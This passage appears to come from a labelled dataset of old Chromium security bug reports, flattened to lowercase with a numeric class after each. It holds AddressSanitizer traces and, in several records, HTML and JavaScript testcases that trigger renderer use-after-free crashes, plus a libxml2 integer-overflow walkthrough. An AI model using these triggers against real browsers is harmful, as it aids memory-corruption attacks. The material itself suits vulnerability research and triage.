13:4420 14:365 15:124 16:8 17:19 18:2 21:2 rfrees by size class 8:44903 9:4837 10:4699 11:1624 12:355 13:655 14:104 15:23 16:8 17:14 18:2 21:2 stats malloc large 28 small slow 2383 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa	11
heap-buffer-overflow in xsltcompilepatterninternal vulnerability details asan reports a heap buffer overflow when the attached page is opened version chrome version 18.0.1005.0 developer build 117194 operating system linux debian 6.0.3 x86_64 reproduction case chrome-asan xslt.xml error should occur on every load for crashes please include the following additional information type of crash tab crash state 8849 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in xsltcompilepatterninternal third_party/libxslt/libxslt/pattern.c:0 1 in xsltaddtemplate 0 2 in xsltparsestylesheetprocess 0 3 in xsltparsestylesheetimporteddoc 0 4 in xsltloadstylesheetpi 0 5 in webcore xsltprocessor transformtostring webcore node wtf string wtf string wtf string 0 6 in webcore document applyxsltransform webcore processinginstruction 0 7 in webcore document collectactivestylesheets wtf vector wtf refptr webcore stylesheet 0ul 0 8 in webcore document updateactivestylesheets webcore styleselectorupdateflag 0 9 in webcore document styleselectorchanged webcore styleselectorupdateflag 0 10 in webcore xmldocumentparser doend 0 11 in webcore xmldocumentparser end 0 12 in webcore documentwriter endifnotloadingmainresource 0 13 in webcore frameloader finishedloading 0 14 in webcore mainresourceloader didfinishloading double 0 15 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 16 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 17 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 18 in resourcedispatcher dispatchmessage ipc message const 0 19 in resourcedispatcher onmessagereceived ipc message const 0 20 in childthread onmessagereceived ipc message const 0 21 in ipc channelproxy context ondispatchmessage ipc message const 0 22 in messageloop runtask base pendingtask const 0 23 in messageloop deferorrunpendingtask base pendingtask const 0 24 in messageloop dowork 0 25 in base messagepumpdefault run base messagepump delegate 0 26 in messageloop runinternal 0 27 in messageloop run 0 28 in renderermain content mainfunctionparams const 0 29 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main.cc:0 30 in content contentmain int char const content contentmaindelegate 0 31 in chromemain 0 32 in main 0 33 in libc_start_main home/aurel32/eglibc/eglibc-2.11.2/csu/libc-start.c:260 is located 0 bytes to the right of 12-byte region allocated by thread t0 here 0 in malloc 0 1 in xmlstrdup 0 2 in xsltparsestylesheetprocess 0 3 in xsltparsestylesheetimporteddoc 0 4 in xsltloadstylesheetpi 0 5 in webcore xsltprocessor transformtostring webcore node wtf string wtf string wtf string 0 6 in webcore document applyxsltransform webcore processinginstruction 0 7 in webcore document collectactivestylesheets wtf vector wtf refptr webcore stylesheet 0ul 0 8 in webcore document updateactivestylesheets webcore styleselectorupdateflag 0 9 in webcore document styleselectorchanged webcore styleselectorupdateflag 0 10 in webcore xmldocumentparser doend 0 11 in webcore xmldocumentparser end 0 12 in webcore documentwriter endifnotloadingmainresource 0 13 in webcore frameloader finishedloading 0 14 in webcore mainresourceloader didfinishloading double 0 15 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 16 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 17 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 18 in resourcedispatcher dispatchmessage ipc message const 0 19 in resourcedispatcher onmessagereceived ipc message const 0 20 in childthread onmessagereceived ipc message const 0 21 in ipc channelproxy context ondispatchmessage ipc message const 0 22 in messageloop runtask base pendingtask const 0 8849 aborting stats 2m malloced 4m for red zones by 15009 calls stats 0m realloced by 39 calls stats 1m freed by 8683 calls stats 0m really freed by 0 calls stats 40m 10246 full pages mmaped in 10 calls mmaps by size class 8:16383 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:64 17:32 mallocs by size class 8:13978 9:455 10:252 11:196 12:34 13:25 14:57 15:4 16:7 17:1 frees by size class 8:8195 9:151 10:163 11:102 12:13 13:15 14:41 15:2 16:1 rfrees by size class stats malloc large 1 small slow 62 shadow byte and word 4 00 04 fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 04 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00	7
heap-use-after-free in webcore eventhandler mousemoved vulnerability details use-after-free can be triggered after trying to access document that was destroyed via mousemove event version 18.0.1005.0 developer build 117208 linux unable to reproduce on 16.0.912.75 m windows 7 x64 and ubuntu 10.10 x64 reproduction case script function body_start q document.getelementbyid root contentdocument a document null q.addeventlistener mousemove function eval a 0 a document.open q.ondomnoderemovedfromdocument function eval a script style body margin 0px style object data a.html id root onload body_start object a.html div id b div iframe src b iframe for crashes please include the following additional information 16434 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore eventhandler mousemoved webcore platformmouseevent const bool usr/local/google/asan/asan-llvm-trunk/llvm/projects/compiler-rt/lib/asan/asan_linux.cc:0 1 in webcore eventhandler fakemousemoveeventtimerfired webcore timer webcore eventhandler media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/eventhandler.cpp:2428 2 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 3 in base internal invokehelper false void base internal runnableadapter void base basetimer_helper timertask void base basetimer_helper timertask makeitso base internal runnableadapter void base basetimer_helper timertask base basetimer_helper timertask media/chromium/chromium/depot_tools/src/./base/bind_internal.h:869 4 in base internal invoker 1 base internal bindstate base internal runnableadapter void base basetimer_helper timertask void base basetimer_helper timertask void base internal ownedwrapper base basetimer_helper timertask void base basetimer_helper timertask run base internal bindstatebase media/chromium/chromium/depot_tools/src/./base/bind_internal.h:1170 5 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 6 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 7 in messageloop dodelayedwork base timeticks media/chromium/chromium/depot_tools/src/base/message_loop.cc:698 8 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:33 9 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 10 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 11 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 12 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 13 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:271 14 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:455 15 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 16 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 17 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 1904 bytes inside of 2440-byte region freed by thread t0 here 0 in free 0 1 in webcore frameview frameview media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:218 2 in webcore frameview frameview media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:188 3 in webcore eventhandler handlemousemoveevent webcore platformmouseevent const webcore hittestresult bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/eventhandler.cpp:1685 4 in webcore eventhandler mousemoved webcore platformmouseevent const bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/eventhandler.cpp:1563 5 in webcore eventhandler fakemousemoveeventtimerfired webcore timer webcore eventhandler media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/eventhandler.cpp:2428 6 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 7 in base internal invokehelper false void base internal runnableadapter void base basetimer_helper timertask void base basetimer_helper timertask makeitso base internal runnableadapter void base basetimer_helper timertask base basetimer_helper timertask media/chromium/chromium/depot_tools/src/./base/bind_internal.h:869 8 in base internal invoker 1 base internal bindstate base internal runnableadapter void base basetimer_helper timertask void base basetimer_helper timertask void base internal ownedwrapper base basetimer_helper timertask void base basetimer_helper timertask run base internal bindstatebase media/chromium/chromium/depot_tools/src/./base/bind_internal.h:1170 9 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 10 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 11 in messageloop dodelayedwork base timeticks media/chromium/chromium/depot_tools/src/base/message_loop.cc:698 12 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:33 13 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 14 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 15 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 16 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 17 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:271 18 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:455 19 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 20 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 21 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 previously allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/fastmalloc.cpp:268 2 in webcore frame create webcore page webcore htmlframeownerelement webcore frameloaderclient media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frame.cpp:203 3 in webkit webframeimpl createchildframe webcore frameloadrequest const webcore htmlframeownerelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/webframeimpl.cpp:2026 4 in webkit frameloaderclientimpl createframe webcore kurl const wtf string const webcore htmlframeownerelement wtf string const bool int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1447 5 in webcore subframeloader loadsubframe webcore htmlframeownerelement webcore kurl const wtf string const wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subframeloader.cpp:266 6 in webcore subframeloader loadorredirectsubframe webcore htmlframeownerelement webcore kurl const wtf atomicstring const bool bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subframeloader.cpp:241 7 in webcore subframeloader requestobject webcore htmlpluginimageelement wtf string const wtf atomicstring const wtf string const wtf vector wtf string 0ul const wtf vector wtf string 0ul const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subframeloader.cpp:148 8 in webcore htmlobjectelement updatewidget webcore plugincreationoption media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlobjectelement.cpp:312 9 in webcore containernode dispatchpostattachcallbacks media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:766 10 in webcore containernode resumepostattachcallbacks media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:732 11 in webcore document recalcstyle webcore node stylechange media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1600 12 in webcore document updatestyleifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:1619 13 in webcore document finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4418 14 in webcore htmldocumentparser preparetostopparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:153 15 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:234 16 in wtf refptr webcore documentloader operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:66 17 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 18 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:647 19 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 20 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:168 21 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 22 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 16434 aborting stats 26m malloced 23m for red zones by 60968 calls stats 0m realloced by 958 calls stats 22m freed by 46019 calls stats 0m really freed by 0 calls stats 76m 19468 full pages mmaped in 19 calls mmaps by size class 8:65532 9:8191 10:4095 11:2047 12:1024 13:1536 14:256 15:128 16:64 17:64 18:16 21:4 mallocs by size class 8:48628 9:6235 10:3287 11:1175 12:295 13:1049 14:117 15:120 16:18 17:35 18:5 21:4 frees by size class 8:35921 9:4914 10:2934 11:803 12:191 13:1009 14:95 15:113 16:11 17:19 18:5 21:4 rfrees by size class stats malloc large 44 small slow 305 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
heap-buffer-overflow in gpu shadertranslator detailed report fuzzer inferno_layout_test_fuzzer crash type heap-buffer-overflow read 1 crash address crash state crash stack strlen webcore v8proxy evaluate operator new minimized testcase 0.66 kb	11
security accelerometer/gyroscope leak keystrokes and speech vulnerability details accelerometer and gyroscope data is provided to websites without permission prompts yet can be used to monitor keystrokes and to a limited extent even speech as well as being used for fingerprinting monitoring keystrokes of nearby keyboard fairly high accuracy 1 traynor/papers/traynor-ccs11.pdf monitoring speech low accuracy 2 fingerprinting version chrome version all operating system any devices with accelerometers and gyroscopes possible solutions adding permission prompts for device motion/orientation would be overly heavy-handed instead we could probably prevent such attacks by limiting either the frequency or the number of bits of precision of data returned by the apis we do n't want to limit them too much of course as that might prevent good use cases alternatively we could detect when the device is stationary and limit the frequency/precision only whilst the device is stationary this would n't interfere with most legitimate use cases except earthquake detection yet would hopefully make such monitoring impractical due to the noise added by the device being in motion i thought there was already a bug for monitoring key strokes but i could n't find one 1 marquardt p verma a carter h traynor p 2011 october sp iphone decoding vibrations from nearby keyboards using mobile phone accelerometers in proceedings of the 18th acm conference on computer and communications security pp 551-562 acm 2 michalevsky y boneh d nakibly g 2014 august gyrophone recognizing speech from gyroscope signals in proceedings of the 23rd usenix conference on security symposium pp 1053-1067 usenix association	2
heap-use-after-free in webcore renderobjectchildlist destroyleftoverchildren detailed report fuzzer bj_doc_fuzzer crash type heap-use-after-free write 8 crash address crash state crash stack webcore renderobjectchildlist destroyleftoverchildren webcore renderblock willbedestroyed free stack webcore containernode removechildren webcore node settextcontent minimized testcase 3.11 kb	11
chrome attempts to load metro_driver.dll when metro is not supported vulnerability details driver metro_driver.dll is susceptible to library hijack version chrome version 19.0.1084.52 m stable os name microsoft windows 7 enterprise os version 6.1.7601 service pack 1 build 7601 reproduction case for actual reproduction all you need to do is to run chrome.exe to notice the finding follow those steps 1 capture events using sysinternals procmon.exe 2 run chrome.exe wait for completion 3 under procmon filter according to path that contains metro_driver.dll for crashes please include the following additional information type of crash none	2
security libxml2 growbuffer integer overflow on 64-bit machines here is the growbuffer macro at parser.c define growbuffer buffer n xmlchar tmp buffer size 2 buffer size n printf growbuffer new_size 08x\n buffer size fflush stdout tmp xmlchar xmlrealloc buffer buffer size sizeof xmlchar if tmp null goto mem_error buffer tmp and some of the code from xmlstringlendecodeentities int buffer_size 0 int nbchars 0 if nbchars buffer_size i xml_parser_buffer_size growbuffer buffer i xml_parser_buffer_size if nbchars buffer_size printf copying d bytes to index 08x buffer_size 08x\n i nbchars buffer_size fflush stdout for i 0 i buffer nbchars cur i added the printf-s for debugging an integer overflow can occur in the calculation of new buffer size but a 2gb malloc has to succeed first so only 64-bit machines are affected the steps for triggering the overflow are 1 grow the buffer up to buffer_size and fill it 2 add another i bytes to buffer 3 growbuffer buffer is called 4 2 2 sign goes negative 5 2 back to positive 6 byte buffer is allocated 7 newly allocated buffer is written to out of range if it was n't for step 5 realloc 2 would fail which would be harmless this is the case for most realloc-s that only multiply size by 2 but i think there are more cases like this one i think a possible solution would be to use ssize_t 64-bit signed instead of int 32-bit signed for buffer_size and nbchars version chrome version 18.0.969.0 developer build 113953 linux operating system arch linux x86_64 reproduction case open bad.xml in chrome it will take quite a long time to process the file 5-10 minutes for my computer that has enough 2gb of free ram i tried it on a 1gb ram computer with swap and it took hours it prints out growbuffer new_size=03ffff83 growbuffer new_size=07ffff87 growbuffer new_size=0fffff8f growbuffer new_size=1fffff9f growbuffer new_size=3fffffbf tcmalloc large alloc 1073741824 bytes growbuffer new_size=7fffffff tcmalloc large alloc 2147487744 bytes growbuffer new_size=00001062 copying 4096 bytes to index=7fffff9b buffer_size=00001062	7
security frame sniffing is not fixed vulnerability details javascript allows to know if a frame scroll to a given fragment id by reading the frame position this can be abused by attacker to steal data see paul original idea my follow-up page 18 the firfox bug on it that i repoted in 2010 latest blog post on the subject new blog post 03/16/12 version all	6
sandboxed processes should not be able to open other sandboxed processes by default sandboxed processes can open other sandboxed processes and manipulate them integrity levels and the restricted group prevent reaching into unsandboxed processes however it s possible to start a renderer with privileged ipcs open the process and manipulate it directly	6
heap-use-after-free in webcore rendertablesection paintcell vulnerability details use-after-free in webcore rendertablesection paintcell version chrome version dev chromium 19.0.1081.0 developer build 128813 os linux webkit 536.4 111994 operating system 64bit linux reproduction case html head style el0 counter-reset c el0 after content counter c counter-reset c el1 after content counter c counter-reset c el2 counter-reset c height 1px width 1px webkit-perspective 1 overflow-x scroll el3 webkit-animation-name a webkit-animation-duration 1s content counter c style script onload function el0 document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1 document.createelement div el1.setattribute id el1 el0.appendchild el1 el2 document.createelement div el2.setattribute id el2 el1.appendchild el2 el3 document.createelement div el3.setattribute id el3 el2.appendchild el3 el2.style.display='table-footer-group script head body body html for crashes please include the following additional information type of crash tab asan crash state 20036 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore rendertablesection paintcell webcore rendertablecell webcore paintinfo webcore intpoint const 0 1 in webcore rendertablesection paintobject webcore paintinfo webcore intpoint const 0 is located 24 bytes inside of 200-byte region freed by thread t0 here 0 in free 0 1 in webcore node detach 0 2 in webcore element detach 0 3 in webcore element recalcstyle webcore node stylechange 0	11
use-after-free due to issues in counter layout vulnerability details use-after-free in webcore renderobject container version chrome version stable beta dev chromium 19.0.1085.0 developer build 129583 os linux webkit 536.5 112458 operating system linux 64bit reproduction case html head style el0 webkit-animation-name a webkit-animation-duration 1s counter-reset c el0 before content counter c counter-reset c width 1px height 1px overflow-x scroll display block el0 after counter-reset c display table-header-group content counter c el2 counter-reset c el3 before content counter c style script onload function el0=document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement div document.body.appendchild el1 el2=document.createelement div el2.setattribute id el2 el1.appendchild el2 el3=document.createelement div el3.setattribute id el3 document.body.appendchild el3 script head body body html for crashes please include the following additional information type of crash tab asan crash state 16346 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderobject container webcore renderboxmodelobject bool const 0 1 in webcore renderobject markcontainingblocksforlayout bool webcore renderobject 0 2 in webcore frameview schedulerelayout 0 is located 24 bytes inside of 184-byte region freed by thread t0 here 0 in free 0 1 in webcore renderobjectchildlist updatebeforeaftercontent webcore renderobject webcore pseudoid webcore renderobject const 0 2 in webcore renderblock styledidchange webcore styledifference webcore renderstyle const 0	11
crash in texsubimage2d on mozilla s webgl performance regression tests version 19.0.1082.1 official build 129233 canary os mac os x 10.6.8 what steps will reproduce the problem 1 visit what is the expected output what do you see instead expect the tests to run instead the renderer crashes while running test 23 out of 45 i think inside texsubimage2d one representative crash af76d177c3e02e63 google chrome framework gles2_implementation.cc:1884 gpu gles2 gles2implementation texsubimage2dimpl google chrome framework gles2_implementation.cc:1818 gpu gles2 gles2implementation texsubimage2d google chrome framework webgraphicscontext3d_command_buffer_impl.cc:1009 webgraphicscontext3dcommandbufferimpl texsubimage2d google chrome framework graphicscontext3dchromium.cpp:682 webcore graphicscontext3d texsubimage2d google chrome framework webglrenderingcontext.cpp:3623 webcore webglrenderingcontext texsubimage2dbase google chrome framework webglrenderingcontext.cpp:3640 webcore webglrenderingcontext texsubimage2dimpl google chrome framework webglrenderingcontext.cpp:3718 webcore webglrenderingcontext texsubimage2d google chrome framework v8webglrenderingcontext.cpp:1863 webcore webglrenderingcontextinternal texsubimage2dcallback	9
heap-buffer-overflow in webcore feconvolvematrix platformapplysoftware repro-file as attachment version chrome version 20.0.1092.0 developer build 130641 asan operating system ubuntu 11.04 x86_64 asan-report 28168 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in webcore feconvolvematrix platformapplysoftware 0 1 in webcore rendersvgresourcefilter postapplyresource webcore renderobject webcore graphicscontext unsigned short webcore path const webcore rendersvgshape const 0 2 in webcore svgrenderingcontext svgrenderingcontext 0 3 in webcore rendersvgcontainer paint webcore paintinfo webcore intpoint const 0 4 in webcore renderbox paint webcore paintinfo webcore intpoint const 0 5 in webcore rendersvgroot paintreplaced webcore paintinfo webcore intpoint const 0 6 in webcore renderreplaced paint webcore paintinfo webcore intpoint const 0 7 in webcore renderlayer paintlayercontents webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 8 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 9 in webcore renderlayer paintlayercontents webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 10 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 11 in webcore renderlayer paint webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion unsigned int 0 12 in webcore frameview paintcontents webcore graphicscontext webcore intrect const 0 13 in webcore scrollview paint webcore graphicscontext webcore intrect const 0 14 in webkit webframeimpl paintwithcontext webcore graphicscontext webkit webrect const 0 15 in webkit webframeimpl paint skcanvas webkit webrect const 0 16 in webkit webviewimpl paint skcanvas webkit webrect const 0 17 in renderwidget paintrect gfx rect const gfx point const skia platformcanvas 0 18 in renderwidget dodeferredupdate 0 19 in renderwidget onupdaterectack 0 20 in renderwidget onmessagereceived ipc message const 0 21 in renderviewimpl onmessagereceived ipc message const 0 22 in messagerouter routemessage ipc message const 0 23 in messagerouter onmessagereceived ipc message const 0 24 in childthread onmessagereceived ipc message const 0 25 in ipc channelproxy context ondispatchmessage ipc message const 0 26 in messageloop runtask base pendingtask const 0 27 in messageloop deferorrunpendingtask base pendingtask const 0 28 in messageloop dowork 0 29 in base messagepumpdefault run base messagepump delegate 0 30 in messageloop runinternal 0 31 in messageloop run 0 32 in renderermain content mainfunctionparams const 0 33 in anonymous namespace contentmainrunnerimpl run content/app/content_main_runner.cc:0 34 in content contentmain int char const content contentmaindelegate 0 35 in chromemain 0 36 in main 0 37 in libc_start_main build/buildd/eglibc-2.13/csu/libc-start.c:258 is located 0 bytes to the right of 52-byte region allocated by thread t0 here 0 in operator new unsigned long 0 1 in wtf bytearray create unsigned long 0 2 in webcore filtereffect aspremultipliedimage webcore intrect const 0 3 in webcore feconvolvematrix platformapplysoftware 0 4 in webcore rendersvgresourcefilter postapplyresource webcore renderobject webcore graphicscontext unsigned short webcore path const webcore rendersvgshape const 0 5 in webcore svgrenderingcontext svgrenderingcontext 0 6 in webcore rendersvgcontainer paint webcore paintinfo webcore intpoint const 0 7 in webcore renderbox paint webcore paintinfo webcore intpoint const 0 8 in webcore rendersvgroot paintreplaced webcore paintinfo webcore intpoint const 0 9 in webcore renderreplaced paint webcore paintinfo webcore intpoint const 0 10 in webcore renderlayer paintlayercontents webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 11 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 12 in webcore renderlayer paintlayercontents webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 13 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int 0 14 in webcore renderlayer paint webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion unsigned int 0 15 in webcore frameview paintcontents webcore graphicscontext webcore intrect const 0 16 in webcore scrollview paint webcore graphicscontext webcore intrect const 0 17 in webkit webframeimpl paintwithcontext webcore graphicscontext webkit webrect const 0 18 in webkit webframeimpl paint skcanvas webkit webrect const 0 19 in webkit webviewimpl paint skcanvas webkit webrect const 0 20 in renderwidget paintrect gfx rect const gfx point const skia platformcanvas 0 21 in renderwidget dodeferredupdate 0 22 in renderwidget onupdaterectack 0 28168 aborting stats 3m malloced 6m for red zones by 24596 calls stats 0m realloced by 51 calls stats 2m freed by 11338 calls stats 0m really freed by 0 calls stats 44m 11270 full pages mmaped in 11 calls mmaps by size class 8:32766 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:64 17:32 mallocs by size class 8:21571 9:1460 10:1022 11:343 12:64 13:28 14:91 15:7 16:9 17:1 frees by size class 8:9090 9:1022 10:862 11:228 12:33 13:17 14:80 15:3 16:3 rfrees by size class stats malloc large 1 small slow 97 shadow byte and word 4 00 00 00 00 00 00 04 fb more shadow bytes 00 00 00 00 00 00 04 fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 04 fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 04 fb fb fb fb fb	9
